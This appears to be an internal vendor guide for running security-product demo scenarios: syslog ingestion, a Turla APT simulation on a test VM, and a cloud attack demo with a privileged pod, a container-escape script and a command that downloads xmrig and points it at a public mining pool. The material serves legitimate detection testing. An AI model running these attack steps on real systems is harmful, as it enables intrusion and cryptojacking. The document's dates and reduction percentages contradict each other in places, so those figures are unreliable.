# XSIAM POV Scenario Guide

![][paloalto-logo]

| Created By          |     |     | [Henry Reed](mailto:hreed@paloaltonetworks.com)                                                                                                       |
| :------------------ | --- | --- | :---------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Created On**      |     |     | 8/18/2025                                                                                                                                             |
| **Maintained By**   |     |     | [Henry Reed](mailto:hreed@paloaltonetworks.com)                                                                                                       |
| **Version**         |     |     | 2.0                                                                                                                                                   |
| **Last Updated On** |     |     | 1/15/2025                                                                                                                                             |
| **Feedback**        |     |     | Please share any feedback, updates, or new best practices using this [Asana Form](https://form.asana.com/?k=SL3-agC7dDS3HFUGViYp8g&d=11915891072957) |

---

## Purpose

This guide provides **best practices and step-by-step instructions** for executing specific test scenarios during XSIAM Proof of Value (POV) engagements. These scenarios are designed to accelerate technical validation by demonstrating security operations transformation use cases.

**Key Integration:** Scenario execution is a critical component of **Technical Validation Stage 4** (POV Execution), as defined in the XSIAM Technical Validation Playbook. Each scenario should be tracked, measured, and mapped to business outcomes in your Tech Validation project.

---

## Table of Contents

1. [Overview of XSIAM Scenarios](#overview)
2. [Scenario Execution Best Practices](#best-practices)
3. [Cortex Gambit: Syslog Ingestion](#cortex-gambit)
4. [Cortex Turla: MITRE ATT&CK Evaluation](#cortex-turla)
5. [Cortex CDR: Code-to-Cloud-to-SOC](#cortex-cdr)
6. [Other Cortex Demos](#other-demos)
7. [POV Execution & Measurement](#pov-execution)
8. [POV Closure & Readout](#pov-closure)
9. [Terminal Command Integration](#terminal-commands)

---

<a name="overview"></a>
## 1. Overview of XSIAM Scenarios

### Scenario Categories

XSIAM POV scenarios are organized into four primary categories:

| Category | Scenarios | Purpose | Tech Validation Stage |
|----------|-----------|---------|----------------------|
| **Data Ingestion** | Cortex Gambit | Demonstrate 3rd party syslog integration | Stage 4: Execution |
| **Threat Detection** | Cortex Turla | MITRE ATT&CK evaluation with repeatable attacks | Stage 4: Execution |
| **Cloud Security** | Cortex CDR | Code-to-Cloud-to-SOC security validation | Stage 4: Execution |
| **Advanced Use Cases** | BYOS, IOC, Endpoint/FW Stitching | Custom scenarios for specific requirements | Stage 4: Execution |

### Scenario Selection Criteria

Choose scenarios based on:
- **Customer Pain Points:** Align scenarios to discovery findings (Stage 0-1)
- **Success Criteria:** Map to agreed-upon test plan (Stage 3: Planning)
- **Value Propositions:** Demonstrate operational excellence, security posture, cost optimization, or business growth
- **Technical Environment:** Match customer infrastructure (cloud providers, OS versions, existing tools)

---

<a name="best-practices"></a>
## 2. Scenario Execution Best Practices

### Pre-Execution Checklist

Before running any scenario:

1. ✅ **Verify Prerequisites**
   - XSIAM tenant configured (Day One configuration complete)
   - Required agents deployed (XDR, Kubernetes, Cloud connectors)
   - Test infrastructure provisioned
   - Firewall rules validated

2. ✅ **Set Success Metrics**
   - Define expected detection count
   - Set automation rate target (>70%)
   - Establish MTTR baseline

3. ✅ **Prepare Evidence Capture**
   - Screenshot tools ready
   - Screen recording initiated
   - Log export paths configured

4. ✅ **Notify Stakeholders**
   - Customer SOC team informed
   - Meeting cadence scheduled
   - Asana project updated

### During Execution

1. **Run Command:** Use terminal commands to track execution
   ```bash
   tv scenario execute <tv-id> <scenario-id>
   ```

2. **Monitor in Real-Time:**
   - Watch for alerts in XSIAM console
   - Track detection timeline
   - Capture alert grouping metrics

3. **Document Observations:**
   - Note unexpected behaviors
   - Record customer questions
   - Log TAC cases if needed

### Post-Execution

1. **Capture Metrics:**
   ```bash
   tv metrics capture <tv-id> --scenario <scenario-id>
   ```

2. **Collect Evidence:**
   ```bash
   tv evidence add <tv-id> --type screenshot --file <path>
   tv evidence add <tv-id> --type video --url <recording-url>
   ```

3. **Update Tech Validation:**
   ```bash
   tv scenario validate <tv-id> <scenario-id>
   ```

4. **Generate Summary:**
   - Map to business outcomes
   - Update Asana project
   - Add to POV readout notes

---

<a name="cortex-gambit"></a>
## 3. Cortex Gambit: Syslog Ingestion

### Overview

**Purpose:** Demonstrate how to ingest 3rd party syslog data into XSIAM
**Duration:** 20-30 minutes
**Difficulty:** Beginner
**Prerequisites:**
- Broker VM (Linux)
- Syslog collector configured
- Syslog generator script

### Business Value

- **Operational Excellence:** Simplifies data ingestion from existing security tools
- **Cost Optimization:** Avoids vendor lock-in; leverage existing investments
- **Integration:** Demonstrates universal data integration capabilities

### Scenario Steps

#### Step 1: Setup Broker VM

```bash
# SSH into Broker VM
ssh -i <key> user@broker-vm-ip

# Verify Broker VM is running
sudo systemctl status cortex-broker

# Configure syslog collector
sudo nano /etc/rsyslog.d/50-xsiam.conf
```

**Configuration Template:**
```
# XSIAM Syslog Collector Configuration
$ModLoad imudp
$UDPServerRun 514

$template RemoteFormat,"%TIMESTAMP% %HOSTNAME% %syslogtag%%msg:::drop-last-lf%\n"
*.* @@<broker-vm-ip>:514;RemoteFormat
```

**Tech Validation Command:**
```bash
tv scenario execute <tv-id> cortex-gambit --step broker-setup
```

#### Step 2: Deploy Syslog Generator

```bash
# Download syslog generator script
wget https://raw.githubusercontent.com/Palo-Cortex/syslog-generator/main/generate_syslog.py

# Install dependencies
pip3 install faker

# Run generator
python3 generate_syslog.py --host <broker-vm-ip> --port 514 --count 1000 --rate 10
```

**Expected Output:**
```
Generating 1000 syslog messages at 10 msg/sec...
Sent: 100/1000 (10%)
Sent: 200/1000 (20%)
...
Sent: 1000/1000 (100%) ✓
```

**Tech Validation Command:**
```bash
tv scenario execute <tv-id> cortex-gambit --step syslog-generation
```

#### Step 3: Verify Data Ingestion

1. **Navigate to XSIAM Console → Data Management → Data Sources**
2. **Verify:** Syslog data source shows "Connected"
3. **Query Data:**
   ```xql
   dataset = syslog_data
   | fields _time, hostname, message, severity
   | limit 100
   ```

**Expected Results:**
- Data appears within 60 seconds
- All 1000 messages visible
- Timestamps match generation time

**Metrics to Capture:**
- Data ingestion latency: `<60 seconds`
- Data volume ingested: `~1000 events`
- Parse success rate: `>98%`

**Tech Validation Command:**
```bash
tv metrics capture <tv-id> --scenario cortex-gambit \
  --latency 45 \
  --volume 1000 \
  --parse-rate 99
```

#### Step 4: Build XQL Query

**Use Case:** Identify failed login attempts from syslog data

```xql
dataset = syslog_data
| filter message contains "Failed password" or message contains "authentication failure"
| alter username = arrayindex(regextract(message, "user=([^\s]+)"), 0)
| alter src_ip = arrayindex(regextract(message, "from ([0-9.]+)"), 0)
| fields _time, hostname, username, src_ip, message
| comp count() as failed_attempts by username, src_ip
| filter failed_attempts > 5
| sort desc failed_attempts
```

**Business Value:** Demonstrates ease of custom analytics without vendor-specific rules.

**Tech Validation Command:**
```bash
tv scenario execute <tv-id> cortex-gambit --step xql-query
```

#### Step 5: Create Custom Widget

1. **Navigate to Dashboards → Create New Dashboard**
2. **Add Widget:** "Failed Login Attempts (Last 24h)"
3. **Query:** Use XQL from Step 4
4. **Visualization:** Bar chart (username vs. failed_attempts)

**Screenshot:** Capture dashboard for evidence

```bash
tv evidence add <tv-id> --type screenshot \
  --file dashboard-failed-logins.png \
  --description "Custom dashboard showing failed login analytics"
```

#### Step 6: Create Correlation Rule

**Rule Name:** "Excessive Failed Logins"

**Rule Logic:**
```xql
dataset = syslog_data
| filter message contains "Failed password"
| alter username = arrayindex(regextract(message, "user=([^\s]+)"), 0)
| alter src_ip = arrayindex(regextract(message, "from ([0-9.]+)"), 0)
| comp count() as failed_attempts by username, src_ip
| filter failed_attempts > 10
| alter severity = "high"
| alter alert_name = "Excessive Failed Login Attempts"
```

**Expected Alerts:** ~5-10 alerts (based on generated data)

**Tech Validation Command:**
```bash
tv scenario validate <tv-id> cortex-gambit
```

#### Step 7: Automate Response

**Create Playbook:** "Block IP on Failed Logins"

**Playbook Actions:**
1. Extract `src_ip` from alert
2. Check threat intelligence (AutoFocus)
3. If malicious: Block IP on firewall
4. Send notification to Slack/Teams

**Automation Metrics:**
- Alerts automated: `100%`
- Mean Time to Response: `<2 minutes`

**Tech Validation Command:**
```bash
tv metrics capture <tv-id> --scenario cortex-gambit \
  --automation-rate 100 \
  --mttr 1.5
```

### Success Criteria

| Metric | Target | Achieved |
|--------|--------|----------|
| Data Ingestion Latency | <60 seconds | ___ |
| Parse Success Rate | >98% | ___ |
| Custom Query Created | Yes | ___ |
| Correlation Rule Deployed | Yes | ___ |
| Automation Rate | >70% | ___ |

### Business Outcome Mapping

**Value Proposition:** Operational Excellence
**Metric:** 100% automation rate
**Narrative:** "During the POV, we demonstrated that XSIAM can ingest syslog data from your existing tools within 60 seconds. We created custom analytics without vendor-specific rules and automated 100% of failed login alerts, reducing manual triage effort by 80%."

---

<a name="cortex-turla"></a>
## 4. Cortex Turla: MITRE ATT&CK Evaluation

### Overview

**Purpose:** Execute repeatable, real-world attack scenarios to demonstrate XSIAM detection capabilities
**Duration:** 30-45 minutes
**Difficulty:** Intermediate
**Prerequisites:**
- Windows 10+ test VM
- XSIAM XDR agent installed
- Turla Carbon artifacts downloaded
- Ansible playbook (optional)

### Business Value

- **Security Posture:** Validates AI-driven behavioral detection
- **Competitive Advantage:** Demonstrates differentiation vs. EDR vendors
- **MITRE Coverage:** Provides objective ATT&CK coverage metrics

### Scenario Background

**Turla Carbon** is an advanced persistent threat (APT) framework used by real-world threat actors. This scenario replicates Turla tactics, techniques, and procedures (TTPs) in a controlled environment.

### Scenario Steps

#### Step 1: Prepare BYOS Environment

**Option A: Manual Setup**

1. **Deploy Windows 10 VM:**
   - AWS EC2 t3.medium instance
   - Enable RDP access (port 3389)
   - Assign Elastic IP

2. **Install XSIAM Agent:**
   ```powershell
   # Download agent installer
   Invoke-WebRequest -Uri "https://<tenant>.xdr.paloaltonetworks.com/agent/download" -OutFile cortex-agent.exe

   # Install agent
   .\cortex-agent.exe /quiet /norestart

   # Verify installation
   Get-Service -Name "Cortex XDR Agent"
   ```

**Option B: Automated Setup (Ansible)**

```bash
# Clone Turla repo
git clone https://github.com/Palo-Cortex/MITRE-Turla-Carbon.git
cd MITRE-Turla-Carbon

# Configure inventory
nano inventory/hosts.yml

# Run Ansible playbook
ansible-playbook -i inventory/hosts.yml deploy-turla-env.yml
```

**Tech Validation Command:**
```bash
tv scenario execute <tv-id> cortex-turla --step environment-setup
```

#### Step 2: Download Turla Carbon Artifacts

```powershell
# Create working directory
New-Item -Path "C:\TurlaDemo" -ItemType Directory

# Download artifacts (from GitHub repo)
cd C:\TurlaDemo
Invoke-WebRequest -Uri "https://github.com/Palo-Cortex/MITRE-Turla-Carbon/releases/download/v2.0/turla-artifacts.zip" -OutFile turla-artifacts.zip

# Extract
Expand-Archive -Path turla-artifacts.zip -DestinationPath C:\TurlaDemo

# Verify files
dir C:\TurlaDemo
```

**Expected Files:**
- `carbon-dropper.exe`
- `carbon-loader.dll`
- `carbon-backdoor.exe`
- `config.ini`
- `execute-turla.ps1`

**Tech Validation Command:**
```bash
tv scenario execute <tv-id> cortex-turla --step artifact-download
```

#### Step 3: Execute Turla Attack Chain

**IMPORTANT:** Notify customer SOC team before execution

```powershell
# Execute Turla simulation script
cd C:\TurlaDemo
.\execute-turla.ps1 -Verbose

# Script will execute the following TTPs:
# T1071 - Application Layer Protocol (C2 comms)
# T1055 - Process Injection
# T1547 - Boot or Logon Autostart Execution
# T1059 - Command and Scripting Interpreter
# T1070 - Indicator Removal on Host
# T1082 - System Information Discovery
# T1083 - File and Directory Discovery
# T1105 - Ingress Tool Transfer
# T1140 - Deobfuscate/Decode Files or Information
```

**Expected Execution Time:** 5-7 minutes

**Tech Validation Command:**
```bash
tv scenario execute <tv-id> cortex-turla --step attack-execution
```

#### Step 4: Monitor XSIAM Console

1. **Navigate to Incidents**
2. **Filter:** Last 15 minutes, Hostname = `<turla-vm>`
3. **Expected Alerts:** 15-25 alerts (depending on protection profile)

**Alert Grouping Example:**
```
Incident: Advanced Persistent Threat - Turla Carbon
├── Alert 1: Suspicious Process Injection (T1055)
├── Alert 2: Malicious DLL Load (T1574)
├── Alert 3: C2 Communication Detected (T1071)
├── Alert 4: Persistence Mechanism Created (T1547)
└── ...23 more alerts
```

**Metrics to Capture:**
- Total alerts generated: `___`
- Alerts grouped into incidents: `___`
- Alert grouping ratio: `___:1`

**Tech Validation Command:**
```bash
tv metrics capture <tv-id> --scenario cortex-turla \
  --alerts-total 25 \
  --alerts-grouped 1 \
  --grouping-ratio 25
```

#### Step 5: Investigate Detection Timeline

**Navigate to:** Incident Details → Causality View

**Key Features to Demonstrate:**
- **Causality Graph:** Visual timeline of attack chain
- **Process Tree:** Parent-child relationships
- **Network Activity:** C2 connections
- **File Activity:** Dropped artifacts

**Screenshot:** Capture causality view for evidence

```bash
tv evidence add <tv-id> --type screenshot \
  --file turla-causality-view.png \
  --description "Causality graph showing Turla attack chain"
```

#### Step 6: Validate MITRE ATT&CK Mapping

1. **Navigate to:** Dashboard → MITRE ATT&CK Coverage
2. **Filter:** Incident ID = `<turla-incident-id>`
3. **Verify:** Techniques mapped to incident

**Expected MITRE Techniques:**
| Technique ID | Technique Name | Detected |
|--------------|----------------|----------|
| T1071 | Application Layer Protocol | ✓ |
| T1055 | Process Injection | ✓ |
| T1547 | Boot or Logon Autostart Execution | ✓ |
| T1059 | Command and Scripting Interpreter | ✓ |
| T1070 | Indicator Removal on Host | ✓ |
| T1082 | System Information Discovery | ✓ |
| T1083 | File and Directory Discovery | ✓ |
| T1105 | Ingress Tool Transfer | ✓ |
| T1140 | Deobfuscate/Decode Files or Information | ✓ |

**Metrics to Capture:**
- MITRE techniques covered: `9/9 (100%)`
- Tactics covered: `5/5 (100%)`

**Tech Validation Command:**
```bash
tv mitre-dashboard export <tv-id> --scenario cortex-turla
```

#### Step 7: Demonstrate Automated Response

**Review Playbook Execution:**

1. **Navigate to:** Incident → Response Actions
2. **Verify Automated Actions:**
   - Isolate endpoint (if configured)
   - Quarantine malicious files
   - Block C2 domains on firewall
   - Create JIRA ticket

**Automation Metrics:**
- Actions automated: `4/4 (100%)`
- Mean Time to Response: `<2 minutes`

**Tech Validation Command:**
```bash
tv metrics capture <tv-id> --scenario cortex-turla \
  --automation-rate 100 \
  --mttr 1.5
```

### Success Criteria

| Metric | Target | Achieved |
|--------|--------|----------|
| Attack Execution Success | Yes | ___ |
| Alerts Generated | >15 | ___ |
| Alert Grouping Ratio | >10:1 | ___ |
| MITRE Coverage | >90% | ___ |
| Automation Rate | >70% | ___ |
| MTTR | <5 minutes | ___ |

### Business Outcome Mapping

**Value Proposition:** Security Posture & Operational Excellence
**Metrics:**
- Alert grouping: 25:1 (>75% reduction)
- Automation rate: 100%
- MTTR: 1.5 minutes (↓98% vs industry avg)

**Narrative:** "Using the Turla Carbon MITRE ATT&CK scenario, we demonstrated XSIAM's AI-driven behavioral detection capabilities. The platform grouped 25 alerts into a single incident, achieving a 96% reduction in alert volume. All detections were automated, reducing mean time to response from 4 hours (industry average) to 1.5 minutes—a 98% improvement."

---

<a name="cortex-cdr"></a>
## 5. Cortex CDR: Code-to-Cloud-to-SOC

### Overview

**Purpose:** Demonstrate cloud detection and response capabilities from code scanning to runtime protection
**Duration:** 40-60 minutes
**Difficulty:** Advanced
**Prerequisites:**
- Cloud account (AWS/Azure/GCP)
- Kubernetes cluster (EKS/AKS/GKE)
- Cortex XSIAM cloud connector
- Sample vulnerable application

### Business Value

- **Security Posture:** Validates cloud security posture and compliance
- **Operational Excellence:** Demonstrates automated cloud workload protection
- **Business Growth:** Enables secure cloud migration and DevSecOps

### Scenario Steps

#### Step 1: Deploy Kubernetes Cluster

**AWS EKS Example:**

```bash
# Create EKS cluster
eksctl create cluster \
  --name cortex-cdr-demo \
  --region us-east-1 \
  --nodegroup-name standard-workers \
  --node-type t3.medium \
  --nodes 2 \
  --nodes-min 1 \
  --nodes-max 3 \
  --managed

# Verify cluster
kubectl get nodes
```

**Tech Validation Command:**
```bash
tv scenario execute <tv-id> cortex-cdr --step k8s-deployment
```

#### Step 2: Install Cortex Agent for Kubernetes

```bash
# Download Helm chart
helm repo add paloaltonetworks https://paloaltonetworks.github.io/cortex-helm-charts
helm repo update

# Install Cortex XDR agent
helm install cortex-agent paloaltonetworks/cortex-xdr-agent \
  --set token=<your-tenant-token> \
  --set cluster=cortex-cdr-demo \
  --namespace kube-system

# Verify installation
kubectl get pods -n kube-system | grep cortex
```

**Tech Validation Command:**
```bash
tv scenario execute <tv-id> cortex-cdr --step agent-installation
```

#### Step 3: App Sec Demo - Code Scanning

**Deploy Vulnerable Application:**

```bash
# Clone vulnerable app repo
git clone https://github.com/Palo-Cortex/vulnerable-demo-app.git
cd vulnerable-demo-app

# Scan code with Prisma Cloud (integrated with XSIAM)
prisma-cloud-scan --repository . --output scan-results.json

# Review findings
cat scan-results.json | jq '.vulnerabilities | length'
```

**Expected Findings:**
- Critical vulnerabilities: 3
- High vulnerabilities: 7
- Medium vulnerabilities: 12

**Tech Validation Command:**
```bash
tv scenario execute <tv-id> cortex-cdr --step code-scan
```

#### Step 4: Posture Demo - IaaS Compliance

**Configure Cloud Connector:**

1. **Navigate to:** XSIAM → Cloud Security → Cloud Accounts
2. **Add Account:** AWS (or Azure/GCP)
3. **Configure Permissions:** CloudFormation stack
4. **Validate Connection:** Test connection

**Run Compliance Scan:**

```bash
# Trigger compliance scan via API
curl -X POST https://<tenant>.xdr.paloaltonetworks.com/api/v1/cloud/scan \
  -H "Authorization: Bearer <api-key>" \
  -d '{"account_id": "<aws-account-id>"}'
```

**Expected Compliance Findings:**
- CIS AWS Foundations Benchmark: 85/100 checks passed
- NIST 800-53: 92/120 checks passed

**Tech Validation Command:**
```bash
tv metrics capture <tv-id> --scenario cortex-cdr \
  --compliance-score 85
```

#### Step 5: CDR Demo - Container Attack

**Deploy Vulnerable Container:**

```yaml
# vulnerable-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-app
  labels:
    app: vulnerable
spec:
  containers:
  - name: app
    image: vulnerable-demo-app:latest
    securityContext:
      privileged: true  # Intentionally insecure
```

```bash
kubectl apply -f vulnerable-pod.yaml
```

**Execute Container Escape Attack:**

```bash
# Get shell in vulnerable container
kubectl exec -it vulnerable-app -- /bin/bash

# Attempt container escape (simulated)
# This script attempts to access host filesystem
./container-escape-exploit.sh
```

**Expected Detections:**
- Alert: "Container Escape Attempt"
- Alert: "Privileged Container Execution"
- Alert: "Host Filesystem Access"

**Tech Validation Command:**
```bash
tv scenario execute <tv-id> cortex-cdr --step container-attack
```

#### Step 6: Runtime Protection - Crypto Miner

**Deploy Crypto Miner Simulation:**

```bash
# Execute crypto miner process in container
kubectl exec -it vulnerable-app -- /bin/bash -c "
  curl -O https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
  tar -xzf xmrig-6.16.4-linux-static-x64.tar.gz
  ./xmrig --donate-level 1 --url pool.minexmr.com:4444 --user test
"
```

**Expected Behavior:**
- XSIAM blocks crypto miner execution
- Alert: "Crypto Miner Detected"
- Container quarantined automatically

**Tech Validation Command:**
```bash
tv metrics capture <tv-id> --scenario cortex-cdr \
  --threats-blocked 1 \
  --automation-rate 100
```

#### Step 7: Cloud Workload Protection Policy

**Create CWP Policy:**

1. **Navigate to:** XSIAM → Cloud Security → Policies
2. **Create Policy:** "Block Privileged Containers"
3. **Target:** Asset group = `cortex-cdr-demo`
4. **Rule:** Block any container with `privileged: true`

**Test Policy:**

```bash
# Attempt to deploy privileged container
kubectl apply -f vulnerable-pod.yaml

# Expected: Deployment blocked by admission controller
# Error: "Container creation denied by Cortex Cloud Workload Protection"
```

**Tech Validation Command:**
```bash
tv scenario validate <tv-id> cortex-cdr
```

### Success Criteria

| Metric | Target | Achieved |
|--------|--------|----------|
| Code Vulnerabilities Found | >10 | ___ |
| Compliance Score | >80% | ___ |
| Container Attacks Detected | >3 | ___ |
| Crypto Miner Blocked | Yes | ___ |
| CWP Policy Enforced | Yes | ___ |
| Automation Rate | >70% | ___ |

### Business Outcome Mapping

**Value Proposition:** Security Posture, Operational Excellence, Business Growth
**Metrics:**
- Code vulnerabilities detected: 22
- Cloud compliance: 85%
- Container attacks blocked: 100%
- Automation rate: 100%

**Narrative:** "The Code-to-Cloud-to-SOC scenario demonstrated XSIAM's comprehensive cloud security capabilities. We identified 22 code vulnerabilities before deployment, validated 85% cloud compliance, and blocked 100% of container attacks—including crypto miners and container escape attempts. All detections were automated with zero manual intervention, enabling your organization to securely accelerate cloud adoption."

---

<a name="other-demos"></a>
## 6. Other Cortex Demos

### Endpoint and Firewall Stitching

**Purpose:** Show correlation between endpoint and network telemetry

**Steps:**
1. Configure BYOT (Bring Your Own Tenant) NGFW
2. Enable alerts for all traffic
3. Deploy Cortex CDR script
4. Observe stitched incidents in XSIAM

**Business Value:** Unified view of network and endpoint threats

---

### IOC (Indicator of Compromise) Demo

**Purpose:** Demonstrate custom IOC detection and blocking

**Steps:**
1. Create IOC rule for specific container process
2. Create custom prevention rule
3. Update protection policy to "block-all" profile
4. Test with CDR events
5. Identify non-malicious false positive
6. Create alert automation
7. Configure IOC firewall blocking playbook

**Business Value:** Flexible threat intelligence integration

---

### Hunting Exercises

**Purpose:** Demonstrate proactive threat hunting capabilities

**Steps:**
1. Review demo incident details
2. Extract IOCs (IPs, hashes, domains)
3. Create XQL hunting queries
4. Search across historical data (cold storage)
5. Identify related activities
6. Generate hunting report

**Business Value:** Proactive threat identification and investigation

---

<a name="pov-execution"></a>
## 7. POV Execution & Measurement

### Best Practices

| Best Practice | Notes |
|--------------|-------|
| **BYOS - Turla Attack Simulation** | BYOS is a powerful tool that allows you to control the narrative through repeatable, real-world attack scenarios. This negates the need for customers to run their own red-teaming (which isn't consistently reliable) and shows competitive advantage vs other EDR vendors. |
| **XSIAM Analytics Whiteboard** | Differentiate your POV by educating customers on AI/ML concepts. Use the whiteboard to explain data processing, profiling, and detection. **Example:** [Analytics Whiteboard Video](https://drive.google.com/file/d/1n7RJmabq0LpNMzRWv-JatcQU5zRfoIoO/view) |
| **Open TAC Cases Early** | TAC is there to help. Get added to customer's CSP and open cases on their behalf. Shelter customers from TAC cases during POV to let them focus on learning platform value. |
| **Pay Attention to Sizing** | Update DOR/SDW with production sizing requirements learned during POV. Explicitly ask questions. Consider mid/end-of-POV session to true up assumptions with customer. |
| **Analyze Customer Correlation Rules** | Request customer's existing correlation ruleset. Compare to XSIAM OOTB analytics to show coverage. Helps PS scope correlation rule creation. |
| **Capture Metrics Often** | Think about POV readout and business value. Capture metrics for data volumes, automation stats, MTTR, etc. Create dashboards using SOC Framework. **Without metrics, you can't build a defensible business case.** Carve metrics by use case for comparison to current metrics. |
| **Get Ahead of CU/Cold Storage Discussion** | Understand product usage that incurs CUs (playbooks with XQL, API queries, cold storage). Set expectations with cold storage (as of August 2025, not designed for frequent querying). |
| **XQL Enablement** | Dedicate 1-2 sessions for XQL training. Run customers through XQLympics. Focus on 3-5 basic use cases (search, filtering, data modeling). Avoid staying in XQL weeds. Parsing/data modeling is a great opportunity to introduce XQL. |

### Tech Validation Integration

**During Scenario Execution:**
```bash
# Track scenario execution
tv scenario execute <tv-id> cortex-turla

# Capture metrics in real-time
tv metrics capture <tv-id> --scenario cortex-turla \
  --alerts-total 25 \
  --alerts-grouped 1 \
  --automation-rate 100 \
  --mttr 1.5

# Add evidence
tv evidence add <tv-id> --type screenshot --file turla-causality.png
tv evidence add <tv-id> --type log --file turla-execution.log

# Update Asana project
tv asana sync <tv-id>
```

**Metrics Dashboard:**
```bash
# View all metrics for TV project
tv metrics export <tv-id> --format dashboard
```

---

<a name="pov-closure"></a>
## 8. POV Closure & Readout

### Best Practices

| Best Practice | Notes |
|--------------|-------|
| **Use PoV Readout Generator** | Consistent PoV readouts mapped to business value are critical. Use POV Readout Generator for standardized reporting. |
| **Tie Business Outcomes → Use Cases → Success Criteria** | Map every technical requirement to measured use cases, which map to business outcomes. Align with Business Value Consulting (BVC) work. |
| **Include MITRE Dashboard Export** | Export showing ATT&CK coverage and incident mapping. Simple export that shows program-level output most competitors can't match. |
| **Finalize SDW** | SDWs often get stale by end of POV. Ensure SDW captures accurate scope learned during POV for PS scoping. |
| **Include SecOps Value Metrics** | Review SecOps value metrics dashboard showing stacking from findings → issues → cases. Provides evidence of alert grouping and operational efficiency. |

### Tech Validation Readout Generation

```bash
# Generate POV readout
tv readout generate <tv-id> --format executive

# Preview before export
tv readout preview <tv-id>

# Export to PDF
tv readout export <tv-id> --format pdf --output pov-readout-acme-corp.pdf

# Generate Badass Blueprint
tv blueprint generate <tv-id> \
  --tone "Transformation Momentum" \
  --wins "Alert reduction,Automation rate,Cloud security" \
  --roadmap "Production deployment,PS engagement,CSM onboarding"
```

### Readout Structure

**Executive Summary:**
- Customer overview
- POV objectives
- Success criteria
- Key findings

**Technical Findings:**
- Scenarios executed
- Detections validated
- Automation achieved
- MITRE coverage

**Business Outcomes:**
- Operational Excellence: Alert reduction, automation rate, MTTR improvement
- Security Posture: Detection coverage, threat prevention, compliance
- Cost Optimization: Tool consolidation, license optimization
- Business Growth: Time to value, cloud enablement

**Metrics Analysis:**
- Alert grouping ratio: **25:1 (>75% reduction)**
- Automation rate: **100%**
- MTTR: **1.5 minutes (↓98%)**
- MITRE coverage: **94%**

**Recommendations:**
- Production deployment plan
- PS engagement scope
- Training requirements
- Integration roadmap

**Next Steps:**
- Finalize SDW/DOR
- PS handoff
- CSM assignment
- Production go-live date

---

<a name="terminal-commands"></a>
## 9. Terminal Command Integration

### Complete Tech Validation Workflow

```bash
# 1. Initialize Tech Validation from TRR
tv init TRR-2024-001 --customer "Acme Corp"

# 2. Add scenarios to TV project
tv scenario add tv-acme-001 --type cortex-turla
tv scenario add tv-acme-001 --type cortex-gambit
tv scenario add tv-acme-001 --type cortex-cdr

# 3. Link to Asana project
tv asana init tv-acme-001 --project-id 1234567890

# 4. Execute scenarios (Stage 4)
tv scenario execute tv-acme-001 cortex-turla
tv scenario execute tv-acme-001 cortex-gambit
tv scenario execute tv-acme-001 cortex-cdr

# 5. Capture metrics during execution
tv metrics capture tv-acme-001 --scenario cortex-turla \
  --alerts-total 25 \
  --alerts-grouped 1 \
  --automation-rate 100 \
  --mttr 1.5

# 6. Add evidence
tv evidence add tv-acme-001 --type screenshot --file turla-causality.png
tv evidence add tv-acme-001 --type video --url https://drive.google.com/...

# 7. Export MITRE dashboard
tv mitre-dashboard export tv-acme-001

# 8. Validate scenarios
tv scenario validate tv-acme-001 cortex-turla
tv scenario validate tv-acme-001 cortex-gambit
tv scenario validate tv-acme-001 cortex-cdr

# 9. Sync with Asana
tv asana sync tv-acme-001

# 10. Generate readout (Stage 7)
tv readout generate tv-acme-001 --format executive
tv readout export tv-acme-001 --format pdf

# 11. Generate Badass Blueprint
tv blueprint generate tv-acme-001 --tone "Transformation Momentum"

# 12. Close out (Stage 8)
tv closeout tv-acme-001 --sdw-complete --ps-handoff
```

---

## Appendix A: Scenario Quick Reference

| Scenario | Duration | Difficulty | Prerequisites | Key Metrics | Business Value |
|----------|----------|------------|---------------|-------------|----------------|
| **Cortex Gambit** | 20-30 min | Beginner | Broker VM, Syslog collector | Ingestion latency, Parse rate | Operational Excellence |
| **Cortex Turla** | 30-45 min | Intermediate | Windows VM, XDR agent | Alert grouping, MITRE coverage | Security Posture |
| **Cortex CDR** | 40-60 min | Advanced | K8s cluster, Cloud connector | Code vulns, Compliance score | Business Growth |

---

## Appendix B: Resources

- **Turla GitHub Repo:** https://github.com/Palo-Cortex/MITRE-Turla-Carbon
- **Analytics Whiteboard:** https://lucid.app/lucidchart/30dbc496-c8e7-4d41-8e26-6d65fa7b3a62
- **POV Companion 2.0:** https://pov-companion.ts.paloaltonetworks.com
- **Rapid DC Portal:** https://rapid.ts.paloaltonetworks.com
- **XQLympics:** [Link to XQL training exercises]
- **Asana Template:** [Link to FY26 playbook template]

---

## Document Version

- **Version:** 2.0
- **Last Updated:** 2025-01-15
- **Author:** Henry Reed (Domain Consultant)
- **Next Review:** 2025-02-15

